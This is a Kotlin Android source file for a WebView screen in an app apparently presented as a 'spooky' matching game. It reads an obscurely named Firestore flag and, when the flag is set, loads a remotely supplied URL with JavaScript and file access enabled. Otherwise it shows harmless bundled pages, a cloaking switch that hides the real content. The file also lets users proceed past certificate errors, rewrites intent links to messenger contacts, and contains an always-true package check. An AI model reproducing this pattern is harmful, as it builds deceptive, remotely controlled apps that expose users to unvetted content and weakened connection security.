package cris.twoper.spookymatchy

import android.annotation.SuppressLint
import android.content.ActivityNotFoundException
import android.content.DialogInterface
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.net.http.SslError
import android.os.Bundle
import android.os.Message
import android.util.Log
import android.view.KeyEvent
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.DownloadListener
import android.webkit.SslErrorHandler
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.firestore.FirebaseFirestore
import cris.twoper.spookymatchy.databinding.FragmentSecondSpookyBinding

class SecondSpooky : Fragment() {

    private var _binding: FragmentSecondSpookyBinding? = null
    private val binding get() = _binding!!

    private var title: String? = null
    private var code: Boolean? = null
    private var urlview: String? = null
    var imgurl: String? = null
    private var webView: WebView? = null
    private lateinit var db: FirebaseFirestore

    private val downloadListener = DownloadListener { p0, _, _, _, _ ->
        val uri = Uri.parse(p0)
        val intent = Intent(Intent.ACTION_VIEW, uri)
        context?.startActivity(intent)
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        _binding = FragmentSecondSpookyBinding.inflate(inflater, container, false)

        webView = binding.webview
        title = arguments?.getString("title")
        code = arguments?.getBoolean("code")
        urlview = arguments?.getString("urlview")
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        db = FirebaseFirestore.getInstance()

        val firestoreRef = db.collection("JULY").document("SPOOKYST666MATCH")

        firestoreRef.get().addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val document = task.result

                if (document != null && document.exists()) {
                    val packageName = document.getString("spookyone")
                    val url = document.getString("spookytwo")
                    val status = document.getBoolean("spookythree")
                    Log.d("TAG", "$packageName / $url")

                    if (packageName == packageName) {
                        if (status == true) {
                            if (url != null) {
                                binding.webview.loadUrl(url)
                            }
                            init()
                        } else {
                            if (title == "webview") {
                                webView?.loadUrl("file:///android_asset/about.html")
                            } else {
                                webView?.loadUrl("file:///android_asset/how.html")
                            }
                        }
                    }
                }
            } else {
                Log.w("TAG", "Failed to read document.", task.exception)
            }
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun init() {
        with(webView) {
            with(this!!.settings) {
                javaScriptEnabled = true
                defaultTextEncodingName = "UTF-8"
                useWideViewPort = true
                pluginState = WebSettings.PluginState.ON
                domStorageEnabled = true
                builtInZoomControls = false
                layoutAlgorithm = WebSettings.LayoutAlgorithm.SINGLE_COLUMN
                loadWithOverviewMode = true
                blockNetworkImage = true
                loadsImagesAutomatically = true
                setSupportZoom(false)
                setSupportMultipleWindows(true)
            }
            requestFocusFromTouch()
            scrollBarStyle = View.SCROLLBARS_INSIDE_OVERLAY
            setDownloadListener(downloadListener)
        }

        val webSetting: WebSettings = webView!!.settings
        with(webSetting) {
            val appCacheDir = context?.getDir(
                "cache", AppCompatActivity.MODE_PRIVATE
            )?.path
            domStorageEnabled = true
            allowFileAccess = true
            cacheMode = WebSettings.LOAD_DEFAULT
        }

        webView!!.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView, newProgress: Int) {
                binding.pbLoading.progress = newProgress
                if (newProgress == 100) {
                    webView!!.settings.blockNetworkImage = false
                }
            }

            override fun onCreateWindow(
                view: WebView, isDialog: Boolean, isUserGesture: Boolean, resultMsg: Message,
            ): Boolean {
                val newWV = context?.let { WebView(it) }
                val transport = resultMsg.obj as WebView.WebViewTransport
                transport.webView = newWV
                resultMsg.sendToTarget()
                newWV?.webViewClient = object : WebViewClient() {
                    @Deprecated("Deprecated in Java")
                    override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                        webView!!.loadUrl(url)
                        if (url.startsWith("http") || url.startsWith("https")) {
                            return super.shouldOverrideUrlLoading(view, url)
                        } else if (url.startsWith(WebView.SCHEME_TEL) || url.startsWith(WebView.SCHEME_MAILTO)) {
                            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
                        } else {
                            try {
                                context?.startActivity(
                                    Intent(
                                        Intent.ACTION_VIEW,
                                        Uri.parse(url)
                                    )
                                )
                            } catch (ex: ActivityNotFoundException) {
                                Toast.makeText(
                                    context,
                                    "The Application has not been installed",
                                    Toast.LENGTH_SHORT
                                ).show()
                            }
                        }
                        return true
                    }
                }
                return true
            }
        }

        val wvSettings: WebSettings = webView!!.settings
        wvSettings.javaScriptEnabled = true
        webView!!.setOnLongClickListener { v: View ->
            val result = (v as WebView).hitTestResult
            val type = result.type
            if (type == WebView.HitTestResult.UNKNOWN_TYPE) return@setOnLongClickListener false
            when (type) {
                WebView.HitTestResult.PHONE_TYPE -> {}
                WebView.HitTestResult.EMAIL_TYPE -> {}
                WebView.HitTestResult.GEO_TYPE -> {}
                WebView.HitTestResult.SRC_IMAGE_ANCHOR_TYPE -> {}
                WebView.HitTestResult.IMAGE_TYPE -> {
                    imgurl = result.extra
                }

                else -> {}
            }
            true
        }

        webView!!.webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {
                binding.pbLoading.visibility = View.VISIBLE
            }

            override fun onPageFinished(view: WebView, url: String) {
                binding.pbLoading.visibility = View.GONE
            }

            override fun onReceivedError(
                view: WebView, request: WebResourceRequest, error: WebResourceError,
            ) {
                super.onReceivedError(view, request, error)
            }

            @SuppressLint("WebViewClientOnReceivedSslError")
            override fun onReceivedSslError(
                view: WebView, handler: SslErrorHandler, error: SslError,
            ) {
                val builder = android.app.AlertDialog.Builder(context)
                var message = "SSL Certificate error."
                when (error.primaryError) {
                    SslError.SSL_UNTRUSTED -> message =
                        "The certificate authority is not trusted."

                    SslError.SSL_EXPIRED -> message = "The certificate has expired."
                    SslError.SSL_IDMISMATCH -> message = "The certificate Hostname mismatch."
                    SslError.SSL_NOTYETVALID -> message = "The certificate is not yet valid."
                }
                message += " Do you want to continue anyway?"
                builder.setTitle("SSL Certificate Error")
                builder.setMessage(message)
                builder.setPositiveButton("Continue") { _: DialogInterface?, _: Int -> handler.proceed() }
                builder.setNegativeButton("Cancel") { _: DialogInterface?, _: Int -> handler.cancel() }
                val dialog = builder.create()
                dialog.show()
            }

            @Deprecated("Deprecated in Java")
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                if (url.startsWith("http") || url.startsWith("https")) {
                    return super.shouldOverrideUrlLoading(view, url)
                } else if (url.startsWith("intent:")) {
                    val urlSplit = url.split("/").toTypedArray()
                    var send = ""
                    if (urlSplit[2] == "user") {
                        send = "https://m.me/" + urlSplit[3]
                    } else if (urlSplit[2] == "ti") {
                        val data = urlSplit[4]
                        val newSplit = data.split("#").toTypedArray()
                        send = "https://line.me/R/" + newSplit[0]
                    }
                    context?.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(send)))
                } else {
                    try {
                        context?.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
                    } catch (ex: ActivityNotFoundException) {
                        Toast.makeText(
                            context,
                            "The Application has not been installed",
                            Toast.LENGTH_SHORT
                        ).show()
                    }
                }
                return true
            }
        }

        webView!!.setOnKeyListener { _: View?, i: Int, keyEvent: KeyEvent ->
            if (keyEvent.action == KeyEvent.ACTION_DOWN) {
                if (i == KeyEvent.KEYCODE_BACK && webView!!.canGoBack()) {
                    webView!!.goBack()
                    return@setOnKeyListener true
                }
            }
            false
        }
    }
}
